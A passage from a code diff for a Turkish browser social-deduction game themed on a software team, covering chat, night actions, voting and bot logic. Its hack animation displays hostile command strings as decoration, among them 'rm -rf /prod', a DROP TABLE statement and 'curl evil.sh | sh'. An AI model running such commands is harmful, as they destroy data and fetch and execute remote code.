+    else if (p.me) t = '<i>sen</i>';
+    else if (isEvil(G.me) && isEvil(p)) { t = '<i style="color:#FF6E98">ortak</i>'; color = '#FF6E98'; }
+  }
+  s.innerHTML = `<span class="dot" style="background:${color || (p.alive ? '#566078' : '#FF6E98')}"></span>${esc(p.name)}${t ? ' ' + t : ''}`;
+  s.style.borderColor = color || '';
+}
+
+/* ---------- sohbet ---------- */
+function addMsg(p, text, ch = 'standup'){
+  const c = $('#chat'); const m = document.createElement('div'); m.className = 'msg';
+  const chLabel = ch === 'standup' ? '' : `<span class="ch ${ch}">#${ch === 'mezarlik' ? 'mezarlık' : ch}</span>`;
+  m.innerHTML = `<span class="av" style="background:${p.shirt}">${esc(p.name[0])}</span><span class="tx">${chLabel}<b>${esc(p.name)}</b>${esc(text)}</span>`;
+  c.appendChild(m); c.scrollTop = c.scrollHeight;
+  if (ch === 'standup' && G.phase === 'meeting') talk(p);
+}
+function sys(text, ch){
+  const c = $('#chat'); const m = document.createElement('div'); m.className = 'msg sys';
+  m.innerHTML = `<span class="tx">${ch ? `<span class="ch ${ch}">#${ch}</span>` : ''}${esc(text)}</span>`;
+  c.appendChild(m); c.scrollTop = c.scrollHeight;
+}
+function talk(p){ const a = stage.querySelector(`.avatar[data-id="${p.id}"]`); if (!a) return; a.classList.add('talk'); setTimeout(() => a.classList.remove('talk'), 1600); }
+function chatMode(){
+  const me = G && G.me;
+  if (!G || G.phase === 'over') return null;
+  if (!me.alive) return 'mezarlik';
+  if (G.phase === 'meeting') return 'standup';
+  if (G.phase === 'night' && isEvil(me)) return 'sabotaj';
+  return null;
+}
+function refreshChatInput(){
+  const mode = chatMode(); const inp = $('#chatInput');
+  inp.disabled = !mode; $('#chatSend').disabled = !mode;
+  inp.placeholder = mode === 'standup' ? '#standup · toplantıya yaz' : mode === 'sabotaj' ? '#sabotaj · ortağına yaz' : mode === 'mezarlik' ? '#mezarlık · sadece ölüler görür' : 'Şu an yazamazsın';
+  $('#chatTitle').textContent = mode === 'sabotaj' ? 'Sohbet · #sabotaj açık' : mode === 'mezarlik' ? 'Sohbet · #mezarlık' : 'Sohbet · #standup';
+}
+$('#chatForm').onsubmit = e => {
+  e.preventDefault();
+  const mode = chatMode(); const inp = $('#chatInput'); const text = inp.value.trim();
+  if (!mode || !text) return;
+  inp.value = '';
+  addMsg(G.me, text, mode);
+  if (mode === 'standup') botsHear(text);
+  if (mode === 'sabotaj') later(1200, () => { const m = partnerOf(G.me); if (m.alive) addMsg(m, rnd(['Tamam, anladım.','Olur, öyle yapalım.','Dikkat et, DevOps izliyor olabilir.']), 'sabotaj'); });
+};
+// botlar oyuncunun mesajındaki isimleri ve sözcükleri okur
+function botsHear(text){
+  const low = text.toLocaleLowerCase('tr');
+  const bad = /(sabotaj|hain|hacker|şüphe|suphe|yalan|oy ver|at[ıi]n|atal[ıi]m)/.test(low);
+  const good = /(temiz|masum|ekip|güven)/.test(low);
+  G.players.filter(p => p.alive && !p.me).forEach(target => {
+    if (!low.includes(target.name.toLocaleLowerCase('tr'))) return;
+    const delta = bad ? 2.2 : good ? -1.8 : 0.5;
+    alive().filter(b => !b.me && b !== target && !isEvil(b)).forEach(b => b.susp[target.id] += delta);
+    if (bad) later(1500 + Math.random()*1200, () => { if (target.alive && G.phase === 'meeting') addMsg(target, rnd([`Neden ben? Gece ofisimden hiç çıkmadım.`, `${G.me.name}, elinde kanıt var mı?`, `Bence asıl ${G.me.name} şüpheli, dikkatimizi dağıtıyor.`])); if (!isEvil(target) && Math.random() < .5) alive().filter(b => !b.me && b !== target && !isEvil(b)).forEach(b => b.susp[G.me.id] += 0.8); });
+  });
+}
+
+/* ---------- rol kartı ve hamle paneli ---------- */
+function renderRole(){
+  const r = ROLES[G.me.role]; const box = $('#roleBox');
+  box.className = 'box rolecard ' + r.team;
+  const usesTx = r.uses === Infinity ? 'Hak: sınırsız' : `Kalan hak: ${G.me.uses}/${r.uses}`;
+  const extra = G.me.role === 'social' && killerRole(G.me) ? '<p class="rdesc" style="color:var(--evil)">Hacker düştü. Artık geceleri sen hackliyorsun.</p>' : '';
+  box.innerHTML = `<h3>Rolün</h3><div class="rname">${r.name}</div><span class="team ${r.team}">${TEAM[r.team]}</span><p class="rdesc">${r.desc}</p>${extra}<span class="uses">${G.me.alive ? usesTx : 'Prod\'dan düştün. Toplantıyı dinleyebilirsin, konuşamazsın.'}</span>`;
+}
+function pickBtn(p, pressed, label){
+  return `<button type="button" class="pbtn" data-id="${p === 'skip' ? 'skip' : p.id}" aria-pressed="${!!pressed}">${p === 'skip' ? '<span class="nm">Atla</span>' : `<span class="av" style="background:${p.shirt}">${esc(p.name[0])}</span><span class="nm">${esc(p.name)}</span>`}${label ? `<span class="ct">${label}</span>` : ''}</button>`;
+}
+function nightTargets(){
+  const me = G.me; const a = actionOf(me);
+  return alive().filter(p => {
+    if (p === me) return false;
+    if ((a === 'hack' || a === 'social') && isEvil(p)) return false;
+    return true;
+  });
+}
+/* ---------- İş Analisti: oy raporu ---------- */
+function reportRows(b){
+  return Object.entries(b.votes).map(([vid, t]) => { const v = byId(+vid); const tp = t === 'skip' ? null : byId(t);
+    return `<div class="pbtn" style="cursor:default"><span class="av" style="background:${v.shirt}">${esc(v.name[0])}</span><span class="nm">${esc(v.name)} → ${tp ? '<b>' + esc(tp.name) + '</b>' : '<span style="color:var(--muted)">Atla</span>'}</span></div>`; }).join('');
+}
+function analystPanel(){
+  const me = G.me;
+  if (G.myReport) return `<div class="result" style="border-left-color:#5AAAFF"><b>Oy raporu · Gün ${G.myReport.day}</b> (sadece sen görüyorsun)</div><div class="picks">${reportRows(G.myReport)}</div>`;
+  if (!me.alive) return '';
+  if (me.uses <= 0) return '<p class="note">Oy raporu hakkını kullandın.</p>';
+  if (!G.lastBallot) return '<p class="note">Henüz oylama yapılmadı. İlk oylamadan sonra raporu açabilirsin.</p>';
+  return `<p class="note">Gün ${G.lastBallot.day} oylamasında kimin kime oy verdiğini görebilirsin. Tek hakkın var.</p><div class="row2"><button class="btn primary" id="openReport" type="button" style="background:#5AAAFF;border-color:#5AAAFF">Oy raporunu aç</button></div>`;
+}
+function bindAnalyst(){ const b = $('#openReport'); if (b) b.onclick = openReport; }
+async function openReport(){
+  if (G.me.uses <= 0 || !G.lastBallot) return;
+  G.me.uses--; G.myReport = G.lastBallot; renderRole(); renderAct();
+  const r = stage.getBoundingClientRect();
+  const lines = Object.entries(G.myReport.votes).map(([vid, t]) => `<span style="display:block;text-align:left;font-family:var(--mono);font-weight:400;font-size:.62em;color:#121829">${esc(byId(+vid).name)} → ${t === 'skip' ? 'Atla' : esc(byId(t).name)}</span>`).join('');
+  const k = el(`<div class="card" style="gap:2px;border-top:6px solid #5AAAFF"><small style="color:#2440C9">Analiz · oy raporu · Gün ${G.myReport.day}</small>${lines}</div>`, r.width/2, r.height*0.42);
+  await anim(k, [{ transform:'translate(-50%,-50%) perspective(600px) rotateX(70deg)', opacity:0 }, { transform:'translate(-50%,-50%) perspective(600px) rotateX(0)', opacity:1 }], { duration:600 });
+  caption('Oy raporu açıldı. <b>Bunu sadece sen görüyorsun.</b>', '#5AAAFF');
+  setTimeout(() => { k.remove(); }, 3500);
+}
+function canActTonight(){ const me = G.me; return me.alive && (me.uses > 0 || killerRole(me)); }
+function renderAct(){
+  const box = $('#actBox'); const me = G.me;
+  document.querySelectorAll('.office').forEach(o => o.classList.remove('pick','sel'));
+  stage.querySelectorAll('.avatar').forEach(a => a.classList.remove('pick'));
+  if (G.phase === 'night'){
+    const a = actionOf(me); const r = ROLES[me.role];
+    if (!me.alive){ box.innerHTML = '<h3>Gece</h3><p class="note">Ölüler gece hamle yapamaz. Sabahı bekle.</p>'; return; }
+    if (me.role === 'analyst'){ box.innerHTML = `<h3>Gece · İş Analisti</h3>${analystPanel()}<div class="row2"><button class="btn" id="endNight" type="button">Geceyi bitir</button></div>`; bindAnalyst(); $('#endNight').onclick = () => finishNight(); return; }
+    if (!canActTonight()){ box.innerHTML = `<h3>Gece</h3><p class="note">Hakkın bitti. Bu gece ofisinde bekliyorsun.</p><div class="row2"><button class="btn primary" id="endNight" type="button">Geceyi bitir</button></div>`; $('#endNight').onclick = () => finishNight(); return; }
+    const verb = a === 'hack' ? 'Hackle' : r.verb;
+    const col = a === 'hack' ? '#FF6E98' : r.color;
+    const ts = nightTargets();
+    box.innerHTML = `<h3>Gece hamlen · ${verb}</h3><div class="picks">${ts.map(p => pickBtn(p, G.myPick === p.id)).join('')}</div>
+      <div class="row2"><button class="btn primary" id="confirmNight" type="button" ${G.myPick == null ? 'disabled' : ''}>${verb}</button><button class="btn" id="passNight" type="button">Bu gece pas geç</button></div>
+      <p class="note">${G.night.done ? 'Hamlen kaydedildi.' : 'Hamleyi onaylayınca gece biter.'}${a === 'hack' && isEvil(me) ? ' Ortağın sabotajcı olduğu için listede yok.' : ''}</p>`;
+    box.querySelectorAll('.pbtn').forEach(b => b.onclick = () => { G.myPick = +b.dataset.id; renderAct(); });
+    ts.forEach(p => { p.dom.classList.add('pick'); p.dom.style.setProperty('--pickc', col); if (G.myPick === p.id) p.dom.classList.add('sel'); });
+    $('#confirmNight').onclick = () => confirmNight();
+    $('#passNight').onclick = () => { G.myPick = null; finishNight(); };
+    return;
+  }
+  if (G.phase === 'morning'){ box.innerHTML = '<h3>Sabah raporu</h3>' + (G.lastNight.myResult ? `<div class="result ${G.lastNight.myResultCls || ''}">${G.lastNight.myResult}</div>` : '<p class="note">Herkes toplantı masasına geçiyor.</p>'); return; }
+  if (G.phase === 'meeting'){
+    const voted = Object.keys(G.votes).length; const total = alive().length;
+    const rep = G.lastNight.myResult ? `<div class="result ${G.lastNight.myResultCls || ''}">${G.lastNight.myResult}</div>` : '';
+    stage.querySelectorAll('.avatar').forEach(a => a.classList.remove('pick'));
+    if (!me.alive){ box.innerHTML = `<h3>Standup ve oylama</h3><p class="note">Ölüler oy veremez. ${voted}/${total} kişi oy verdi.</p>`; return; }
+    const mine = G.votes[me.id];
+    const ts = alive().filter(p => p !== me);
+    box.innerHTML = `<h3>Standup ve oylama · oylar gizli</h3>${rep}
+      <div class="picks">${ts.map(p => pickBtn(p, mine === p.id, G.escalated[p.id] ? '+2' : '')).join('')}${pickBtn('skip', mine === 'skip')}</div>
+      <p class="note"><b>${voted}/${total}</b> kişi oy verdi. ${mine == null ? 'Tartışırken istediğin an oy verebilirsin.' : 'Oyunu toplantı bitene kadar değiştirebilirsin.'} Herkes oy verince ya da süre bitince sonuç açıklanır. Oy vermeyen Atla sayılır.</p>`;
+    box.querySelectorAll('.pbtn').forEach(b => b.onclick = () => castMyVote(b.dataset.id === 'skip' ? 'skip' : +b.dataset.id));
+    ts.forEach(p => { p.dom.classList.add('pick'); p.dom.style.setProperty('--pickc', '#FF6E98'); if (mine === p.id) p.dom.classList.add('sel'); const a = stage.querySelector(`.avatar[data-id="${p.id}"]`); if (a){ a.classList.add('pick'); a.onclick = () => onOfficeClick(p); } });
+    return;
+  }
+  if (G.phase === 'verdict'){ box.innerHTML = `<h3>Sonuç</h3>${G.verdictHtml || ''}${me.role === 'analyst' && me.alive ? analystPanel() : ''}`; bindAnalyst(); return; }
+  box.innerHTML = '';
+}
+function onOfficeClick(p){
+  if (!G || !p.dom.classList.contains('pick')) return;
+  if (G.phase === 'night'){ G.myPick = p.id; renderAct(); }
+  else if (G.phase === 'meeting') castMyVote(p.id);
+}
+function castMyVote(v){
+  if (G.phase !== 'meeting' || !G.me.alive) return;
+  const first = G.votes[G.me.id] == null;
+  G.votes[G.me.id] = v; renderAct();
+  if (first) checkVotesDone();
+}
+
+/* ---------- zamanlayıcı ---------- */
+let tick = null;
+function setPhase(phase, name, sub, secs, onEnd){
+  G.phase = phase; $('#phName').textContent = name; $('#phSub').textContent = sub;
+  G.timer = secs; clearInterval(tick);
+  $('#timer').textContent = secs ? fmt(secs) : '--';
+  if (secs){ const e = epoch; tick = setInterval(() => { if (e !== epoch) return clearInterval(tick); G.timer--; $('#timer').textContent = fmt(Math.max(0, G.timer)); if (G.timer <= 0){ clearInterval(tick); onEnd && onEnd(); } }, 1000); }
+  refreshChatInput(); renderAct(); updateMic();
+}
+const fmt = s => `${Math.floor(s/60)}:${String(s%60).padStart(2,'0')}`;
+
+/* ---------- gece ---------- */
+function startNight(){
+  G.day++; G.night = { acts:{}, done:false }; G.myPick = null; G.escalated = {};
+  stage.classList.remove('day'); clearFx(); hideCaption();
+  stage.querySelectorAll('.avatar').forEach(a => a.remove());
+  G.players.forEach(p => { p.dom.className = 'office' + (p.alive ? '' : ' dead'); setSign(p); });
+  // botlar karar verir
+  alive().filter(p => !p.me).forEach(p => { const t = botNightPick(p); if (t != null) G.night.acts[p.id] = t; });
+  G.analystReport = null;
+  const an = alive().find(p => !p.me && p.role === 'analyst');
+  if (an && an.uses > 0 && G.lastBallot){
+    const b = G.lastBallot; const outP = b.out != null ? byId(b.out) : null;
+    if ((outP && !isEvil(outP)) || G.day >= 3 || Math.random() < .35){ an.uses--; G.analystReport = { by:an, ballot:b }; }
+  }
+  const secs = G.me.alive ? 40 : 4;
+  setPhase('night', `Gece ${G.day}`, G.me.alive ? 'Herkes ofisinde. Hamleni seç.' : 'Sen izliyorsun', secs, () => finishNight());
+  caption(`Gece ${G.day}. Ofislerin ışıkları kısıldı.`, '#A99CFF');
+  if (isEvil(G.me) && G.me.alive){
+    const mate = partnerOf(G.me);
+    if (mate.alive && G.night.acts[mate.id] != null){
+      const t = byId(G.night.acts[mate.id]);
+      later(1800, () => addMsg(mate, actionOf(mate) === 'hack' ? `Bu gece ${ek(t.name,'i')} hackliyorum.` : `${ek(t.name,'e')} tuzak kuruyorum, Senior bakarsa bizden görür.`, 'sabotaj'));
+    }
+  }
+}
+function botNightPick(p){
+  const a = actionOf(p);
+  if (!(p.uses > 0 || a === 'hack')) return null;
+  const others = alive().filter(q => q !== p);
+  if (a === 'hack' || a === 'social'){
+    const ts = others.filter(q => !isEvil(q));
+    // bilgi sızdıran oyuncuları hedefle
+    const claimed = ts.filter(q => G.seniorClaims.includes(q.id));
+    if (a === 'hack' && claimed.length && Math.random() < .7) return rnd(claimed).id;
+    if (a === 'social' && Math.random() < .45) return null;
+    return rnd(ts).id;
+  }
+  if (a === 'senior'){ const ts = others.filter(q => p.known[q.id] == null); if (!ts.length) return null; ts.sort((x, y) => p.susp[y.id] - p.susp[x.id]); return (Math.random() < .6 ? ts[0] : rnd(ts)).id; }
+  if (a === 'qa'){ if (Math.random() < .25) return null; const claimed = others.filter(q => G.seniorClaims.includes(q.id) && !isEvil(q)); return (claimed.length ? rnd(claimed) : rnd(others)).id; }
+  if (a === 'devops'){ if (G.day < 2 && Math.random() < .5) return null; return rnd(others).id; }
+  if (a === 'scrum'){ if (Math.random() < .5) return null; const ts = others.slice().sort((x, y) => p.susp[y.id] - p.susp[x.id]); return ts[0].id; }
+  if (a === 'lead'){ if (G.day < 2) return null; const ts = others.slice().sort((x, y) => p.susp[y.id] - p.susp[x.id]); return p.susp[ts[0].id] > 3 ? ts[0].id : null; }
+  return null;
+}
+async function confirmNight(){
+  if (G.myPick == null || G.night.done) return;
+  G.night.done = true; G.night.acts[G.me.id] = G.myPick;
+  const t = byId(G.myPick);
+  document.querySelectorAll('.office').forEach(o => o.classList.remove('pick'));
+  $('#actBox').innerHTML = '<h3>Gece</h3><p class="note">Hamlen yapılıyor…</p>';
+  await nightAnim(actionOf(G.me), t);
+  later(1400, () => finishNight());
+}
+async function nightAnim(a, t){
+  const e = epoch;
+  if (a === 'hack'){
+    const p = pt(t, 200, 95);
+    const lines = ['rm -rf /prod','sudo kill -9',`DROP TABLE ${t.name.toLowerCase()};`,'curl evil.sh | sh'];
+    await Promise.all(lines.map((txt, i) => { const d = el(txt, p.x - 160, p.y - 40 + i*18, 'term'); return anim(d, [{ transform:'translate(0,0)', opacity:0 }, { opacity:1, offset:.2 }, { transform:`translate(160px,${40 - i*18}px) scale(.4)`, opacity:0 }], { duration:900, delay:i*110, easing:'cubic-bezier(.6,0,.9,.6)' }); }));
+    if (e !== epoch) return;
+    t.dom.classList.add('red','glitch'); setSign(t, '<i style="color:#FF6E98">hedef</i>', '#FF6E98');
+    setTimeout(() => t.dom.classList.remove('glitch'), 900);
+    caption(`<b>${esc(t.name)}</b> hedef alındı. Sonucu sabah göreceksin.`, '#FF6E98');
+  } else if (a === 'social'){
+    const p = pt(t, 150, 30);
+    const w = el(`<div class="card" style="color:#C42656"><small>git log · sahte commit</small>feat: backdoor ekle</div>`, p.x - 80, p.y - 40);
+    await anim(w, [{ opacity:0, transform:'translateY(14px) scale(.9)' }, { opacity:1, transform:'none' }], { duration:450 });
+    setSign(t, '<i style="color:#FF6E98">tuzak</i>', '#FF6E98');
+    caption(`<b>${esc(t.name)}</b>${sfx(t.name,'in')} geçmişi sahtelendi. Bu gece Senior Dev onu sabotajcı görür.`, '#FF6E98');
+  } else if (a === 'senior'){
+    const p = pt(t, 150, 110);
+    const m = el(`<svg width="54" height="54" viewBox="0 0 64 64"><circle cx="26" cy="26" r="18" fill="rgba(169,156,255,.18)" stroke="#A99CFF" stroke-width="5"/><line x1="40" y1="40" x2="58" y2="58" stroke="#A99CFF" stroke-width="7" stroke-linecap="round"/></svg>`, 0, 0);
+    await anim(m, [{ transform:`translate(${p.x-90}px,${p.y-20}px)`, opacity:0 }, { transform:`translate(${p.x}px,${p.y-50}px)`, opacity:1, offset:.5 }, { transform:`translate(${p.x-27}px,${p.y-27}px)`, opacity:1 }], { duration:1300, easing:'ease-in-out' });
+    setSign(t, '<i style="color:#A99CFF">review</i>', '#A99CFF');
+    caption(`<b>${esc(t.name)}</b>${sfx(t.name,'in')} kodu review ediliyor. Sonuç sabah gelecek.`, '#A99CFF');
+  } else if (a === 'qa'){
+    const c = pt(t, 150, 160); const rx = 130*c.s, ry = 72*c.s;
+    const sh = el('', c.x - rx, c.y - ry); Object.assign(sh.style, { width:2*rx+'px', height:2*ry+'px', borderRadius:'50%', border:'3px solid #3FCDB8', boxShadow:'0 0 30px rgba(63,205,184,.7), inset 0 0 30px rgba(63,205,184,.4)' });
+    await anim(sh, [{ opacity:0, transform:'scale(.7)' }, { opacity:1, transform:'scale(1.06)' }, { opacity:.9, transform:'scale(1)' }], { duration:700 });
+    setSign(t, '<i style="color:#3FCDB8">korunuyor</i>', '#3FCDB8');
+    caption(`<b>${esc(t.name)}</b> bu gece test altında. Hacklenirse kurtulur.`, '#3FCDB8');
+  } else if (a === 'devops'){
+    const p = pt(t, 250, 20);
+    const w = el(`<div class="card" style="font-size:12px;background:#0A0C1C;color:#F2C94C;border:1px solid #2B3264"><small style="color:#979EC6">tail -f</small>${esc(t.name.toLowerCase())}.log izleniyor</div>`, p.x - 60, p.y - 30);
+    await anim(w, [{ opacity:0, transform:'scale(.9)' }, { opacity:1, transform:'none' }], { duration:400 });
+    setSign(t, '<i style="color:#F2C94C">izleniyor</i>', '#F2C94C');
+    caption(`<b>${esc(t.name)}</b>${sfx(t.name,'in')} ofisi izleniyor. Gelenleri sabah göreceksin.`, '#F2C94C');
+  } else if (a === 'scrum'){
+    const p = pt(t, 95, 55);
+    const k = el(`<div class="card" style="background:#FFFFFF"><small style="color:#2440C9">Takvim daveti</small>Acil toplantı<small>02:00 · zorunlu</small></div>`, p.x - 60, p.y - 30);
+    await anim(k, [{ transform:'translate(-120px,-60px) rotate(-30deg) scale(.6)', opacity:0 }, { transform:'rotate(-6deg)', opacity:1 }], { duration:900 });
+    t.dom.classList.add('blocked'); setSign(t, '<i>toplantıda</i>');
+    caption(`<b>${esc(t.name)}</b> bu gece toplantıda. Hamlesi boşa gidecek.`, '#7FA2FF');
+  } else if (a === 'lead'){
+    const p = pt(t, 150, 40);
+    const k = el(`<div class="card" style="background:#FFFFFF;color:#C42656"><small>JIRA · P1</small>ESCALATED<small>${esc(t.name)} · retroda öncelikli</small></div>`, p.x - 70, p.y - 40);
+    await anim(k, [{ transform:'translateY(-120px) rotate(-20deg) scale(1.4)', opacity:0 }, { transform:'rotate(-6deg)', opacity:1 }], { duration:650, easing:'cubic-bezier(.6,0,.9,.4)' });
+    setSign(t, '<i style="color:#C42656">escalated</i>', '#C42656');
+    caption(`<b>${esc(t.name)}</b> escalate edildi. Yarın oylamaya 2 oyla başlayacak.`, '#C42656');
+  }
+}
+
+function finishNight(){
+  if (G.phase !== 'night') return;
+  epoch++; // bekleyen gece işlerini iptal et
+  const acts = G.night.acts; const res = { deaths:[], saved:false, private:{} };
+  // hak düşür
+  Object.keys(acts).forEach(id => { const p = byId(+id); if (actionOf(p) !== 'hack' && p.uses !== Infinity) p.uses--; });
+  // 1. Scrum engeli
+  const blocked = new Set();
+  G.players.filter(p => p.alive && p.role === 'scrum' && acts[p.id] != null).forEach(p => blocked.add(acts[p.id]));
+  const live = {}; Object.keys(acts).forEach(id => { if (!blocked.has(+id)) live[id] = acts[id]; else res.private[id] = { text:'Dün gece acil toplantıya çekildin. Hamlen boşa gitti.', cls:'warn' }; });
+  const actor = role => G.players.find(p => p.alive && actionOf(p) === role && live[p.id] != null);
+  const qa = actor('qa'), killer = G.players.find(p => p.alive && killerRole(p) && live[p.id] != null);
+  const sm = G.players.find(p => p.alive && p.role === 'social' && !killerRole(p) && live[p.id] != null);
+  const framed = sm ? live[sm.id] : null;
+  const protectedId = qa ? live[qa.id] : null;
+  // 2. Senior
+  const sen = actor('senior');
+  if (sen){ const t = byId(live[sen.id]); const evil = isEvil(t) || framed === t.id; sen.known[t.id] = evil ? 'evil' : 'town'; res.private[sen.id] = { text:`Code review: <b>${esc(t.name)}</b> ${evil ? '<b style="color:var(--evil)">Sabotaj</b> ekibinde.' : '<b style="color:var(--town)">Ekip</b> üyesi.'}`, cls: evil ? 'evil' : 'town', target:t.id, evil }; }
+  // 3. DevOps
+  const dev = actor('devops');
+  if (dev){ const tid = live[dev.id]; const vis = Object.keys(live).map(Number).filter(id => id !== dev.id && live[id] === tid).map(byId); res.private[dev.id] = { text:`Loglar: <b>${esc(byId(tid).name)}</b>${sfx(byId(tid).name,'in')} ofisine ${vis.length ? vis.map(v => '<b>' + esc(v.name) + '</b>').join(', ') + ' gitti.' : 'kimse gelmedi.'}`, cls:'warn', target:tid, visitors:vis.map(v => v.id) }; }
+  // 4. Tech Lead
+  const lead = actor('lead');
+  if (lead) { G.escalated[live[lead.id]] = 2; }
+  // 5. Hack
+  if (killer){
+    const tid = live[killer.id];
+    if (tid === protectedId) { res.saved = true; if (qa) res.private[qa.id] = { text:`<b>${esc(byId(tid).name)}</b>${sfx(byId(tid).name,'e')} gece saldırı oldu. Testlerin onu kurtardı.`, cls:'town', target:tid }; }
+    else { const v = byId(tid); v.alive = false; res.deaths.push(v); }
+  }
+  if (qa && !res.private[qa.id]) res.private[qa.id] = { text:`<b>${esc(byId(live[qa.id]).name)}</b>${sfx(byId(live[qa.id]).name,'i')} korudun. Saldırı olmadı.`, cls:'town' };
+  if (lead && !res.private[lead.id]) res.private[lead.id] = { text:`<b>${esc(byId(live[lead.id]).name)}</b> için escalation açtın. Oylamaya 2 oyla başlayacak.`, cls:'warn' };
+  // ölü escalation düşer
+  Object.keys(G.escalated).forEach(id => { if (!byId(+id).alive) delete G.escalated[id]; });
+  const mine = res.private[G.me.id];
+  res.myResult = mine ? mine.text : null; res.myResultCls = mine ? mine.cls : '';
+  G.lastNight = res;
+  // bot bilgisi
+  if (dev && !dev.me){ const info = res.private[dev.id]; info.visitors.forEach(v => { if (res.deaths.some(d => d.id === info.target)) dev.susp[v] += 4; else dev.susp[v] += 1; }); }
+  if (sen && !sen.me){ const info = res.private[sen.id]; sen.susp[info.target] += info.evil ? 20 : -10; }
+  morning();
+}
+
+/* ---------- sabah ---------- */
+async function morning(){
+  setPhase('morning', `Gün ${G.day} · sabah`, 'Olay raporu', 0);
+  clearFx(); hideCaption();
+  G.players.forEach(p => { p.dom.classList.remove('red','blocked','sel','pick'); setSign(p); });
+  stage.classList.add('day');
+  const e = epoch;
+  await wait(900); if (e !== epoch) return;
+  const res = G.lastNight;
+  if (res.deaths.length){
+    for (const v of res.deaths){
+      const p = pt(v, 150, 10);
+      const siren = el('', p.x - 14, p.y - 30); Object.assign(siren.style, { width:'28px', height:'16px', borderRadius:'14px 14px 4px 4px', background:'#FF3B6B', boxShadow:'0 0 30px 12px rgba(255,59,107,.7)' });
+      await anim(siren, [{ opacity:1 }, { opacity:.2 }, { opacity:1 }, { opacity:.2 }, { opacity:1 }, { opacity:0 }], { duration:1300 });
+      if (e !== epoch) return;
+      v.dom.classList.add('dead'); setSign(v);
+      caption(`INCIDENT · <b>${esc(v.name)}</b> prod'dan düştü. Gerçek rolü: ${ROLES[v.role].name}.`, '#FF6E98');
+      sys(`Gece ${v.name} hacklendi. Rolü: ${ROLES[v.role].name} (${TEAM[ROLES[v.role].team]}).`);
+      if (v.me) { renderRole(); sys('Prod\'dan düştün. Toplantıyı dinleyebilirsin ama konuşamazsın. #mezarlık açık.', 'mezarlik'); }
+    }
+  } else if (res.saved){
+    caption('Gece bir saldırı engellendi. Kimse düşmedi.', '#3FCDB8');
+    sys('Gece bir saldırı oldu ama engellendi. Kimse düşmedi.');
+  } else {
+    caption('Sakin bir gece. Kimse düşmedi.', '#3FCDB8');
+    sys('Gece kimse düşmedi.');
+  }
+  renderAct(); renderRole();
+  await wait(2200); if (e !== epoch) return;
+  if (checkWin()) return;
+  startMeeting();
+}
+function seatPos(i, n){ const a = Math.PI/2 + i*2*Math.PI/n; return { x: 50 + 15.5*Math.cos(a), y: 54 + 11*Math.sin(a) }; }
+async function walkToTable(){
+  const ps = alive(); const n = Math.max(ps.length, 3);
+  const sr = stage.getBoundingClientRect();
+  ps.forEach((p, i) => {
+    const o = pt(p, 184, 125);
+    const a = document.createElement('div'); a.className = 'avatar'; a.dataset.id = p.id; a.textContent = p.name[0]; a.style.background = p.shirt;
+    a.style.left = (o.x / sr.width * 100) + '%'; a.style.top = (o.y / sr.height * 100) + '%';
+    stage.appendChild(a); p.dom.classList.add('away');
+    requestAnimationFrame(() => requestAnimationFrame(() => { const s = seatPos(i, n); a.style.left = s.x + '%'; a.style.top = s.y + '%'; }));
+  });
+  await wait(1400);
+}
+
+/* ---------- toplantı ---------- */
+async function startMeeting(){
+  const e = epoch;
+  hideCaption(); clearFx();
+  G.votes = {};
+  setPhase('meeting', `Gün ${G.day} · standup ve oylama`, 'Konuşurken oy verebilirsin', G.me.alive ? 75 : 25, () => endVote());
+  await walkToTable(); if (e !== epoch) return;
+  caption(G.me.alive ? 'Herkes masada. <b>Space</b> ile konuş, istediğin an oy ver.' : 'Toplantıyı dinliyorsun. Ölüler konuşamaz.', '#3FCDB8');
+  Object.keys(G.escalated).forEach(id => sys(`JIRA: ${byId(+id).name} için P1 escalation açıldı. Oylamaya 2 oyla başlıyor. Kimin açtığı gizli.`));
+  const lines = meetingScript();
+  let t = 1200;
+  lines.forEach(l => { t += 2600 + Math.random()*1600; later(t, () => { if (G.phase !== 'meeting' || !l.who.alive) return; addMsg(l.who, l.text); l.effect && l.effect(); }); });
+  // botlar tartışma ilerledikçe oy verir; ikna olan erken, kararsız olan geç
+  alive().filter(p => !p.me).forEach(b => later(t * (0.55 + Math.random()*0.5) + 1500, () => { if (G.phase !== 'meeting' || !b.alive) return; G.votes[b.id] = botVote(b); renderAct(); checkVotesDone(); }));
+  // ölüler mezarlıkta konuşur
+  if (!G.me.alive){ const ghost = G.players.find(p => !p.alive && !p.me); if (ghost) later(5000, () => addMsg(ghost, rnd(['Buradan her şey daha net görünüyor.','Keşke dün gece başka birine baksaydım.','Toplantıyı izlemek ayrı bir işkence.']), 'mezarlik')); }
+}
+function townBots(){ return alive().filter(p => !p.me && !isEvil(p)); }
+function meetingScript(){
+  const L = []; const res = G.lastNight;
+  const bots = alive().filter(p => !p.me);
+  const say = (who, text, effect) => { if (who) L.push({ who, text, effect }); };
+  if (res.deaths.length){ const v = res.deaths[0]; say(rnd(bots), rnd([`${v.name} gitti. ${ROLES[v.role].name} kaybettik.`, `Sabah ilk iş ${ek(v.name,'in')} ofisine baktım, ekran kıpkırmızı.`, `${v.name} yoksa ${ROLES[v.role].name} işleri kimde kaldı şimdi?`])); }
+  // QA bot kurtardıysa söyler
+  const qa = bots.find(p => p.role === 'qa');
+  if (res.saved && qa && res.private[qa.id] && Math.random() < .7){ const tid = res.private[qa.id].target; say(qa, `Ben QA'yım. Dün gece ${ek(byId(tid).name,'i')} korudum ve saldırı oldu. ${byId(tid).name} temiz bence.`, () => townBots().forEach(b => b.susp[tid] -= 3)); }
+  // Senior bot sonucu
+  const sen = bots.find(p => p.role === 'senior');
+  const senInfo = sen && res.private[sen.id];
+  if (senInfo && senInfo.target != null && byId(senInfo.target).alive){
+    const t = byId(senInfo.target);
+    if (senInfo.evil || Math.random() < .6){
+      say(sen, senInfo.evil ? `Ben Senior Dev'im. Dün gece ${ek(t.name,'in')} koduna baktım: Sabotaj çıktı. Oylar ${ek(t.name,'e')}.` : `Senior Dev benim. ${ek(t.name,'e')} baktım, Ekip çıktı.`, () => { G.seniorClaims.push(sen.id); townBots().forEach(b => { if (b !== sen) b.susp[t.id] += senInfo.evil ? 6 : -4; }); });
+      if (isEvil(t) || (senInfo.evil && !isEvil(t))) say(t, senInfo.evil ? rnd([`Bu yalan. Ben ${rnd(['QA\'yım','DevOps\'um','Scrum Master\'ım'])}, ${sen.name} bizi birbirimize düşürüyor.`, `${sen.name} kesin sabotajcı, gerçek Senior olsa böyle hızlı konuşmazdı.`]) : `Teşekkürler ${sen.name}.`, () => { if (senInfo.evil) townBots().forEach(b => { if (b !== sen && b !== t) b.susp[sen.id] += 1; }); });
+    }
+  }
+  // DevOps bot
